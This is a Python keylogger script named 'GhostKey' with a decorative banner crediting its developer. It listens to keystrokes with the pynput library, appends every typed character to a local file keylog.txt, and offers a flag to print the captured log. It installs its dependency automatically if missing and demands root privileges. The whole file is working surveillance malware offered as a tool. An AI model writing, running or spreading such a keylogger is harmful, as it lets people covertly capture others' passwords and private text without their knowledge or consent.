#!/usr/bin/env python3

import os
import sys
import subprocess
import time
from os import system
from time import sleep
import argparse
try:
    import pynput
except ImportError:
    subprocess.run(['pip', 'install', 'pynput'])
 
from pynput import keyboard

R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
W = '\033[1;37m'


def hprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(8.0 / 100)

logo = """
\033[1;35m


 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗  ██╗███████╗██╗   ██╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║ ██╔╝██╔════╝╚██╗ ██╔╝
██║  ███╗███████║██║   ██║███████╗   ██║   █████╔╝ █████╗   ╚████╔╝ 
██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔═██╗ ██╔══╝    ╚██╔╝  
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██║  ██╗███████╗   ██║   
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝   ╚═╝   
          
\033[1;31m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m [\033[1;33m+\033[1;32m]\033[1;36m DEVELOPED By \033[1;31m(\033[1;33mKaran_Parelkar\033[1;31m)~~~~~~~|
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m [\033[1;33m+\033[1;32m]\033[1;36m Join Me \033[1;31m(\033[1;33mgithub ==> KaranParelkar\033[1;31m)~~~~~|
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
system("clear")
print (logo)

LOG_FILE = "keylog.txt"

def keyPressed(key):
    try:
        char = key.char
        with open(LOG_FILE, 'a') as logKey:
            logKey.write(char)
    except AttributeError:
        # Non-character key pressed (e.g., shift, ctrl, etc.)
        pass
    except Exception as e:
        print(f"Error: {e}")

def start_keylogger():
    hprint("[*] Starting keylogger...")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()

def print_log():
    try:
        with open(LOG_FILE, 'r') as logFile:
            print(logFile.read())
    except FileNotFoundError:
        print("[-] Log file not found.")
    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Simple keylogger tool")
    parser.add_argument("-l", "--log", action="store_true", help="Print the contents of the keylog file")
    args = parser.parse_args()

    if args.log:
        print_log()
    else:
        start_keylogger()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script needs root privileges to run.")
        sys.exit(1)
    
    main()
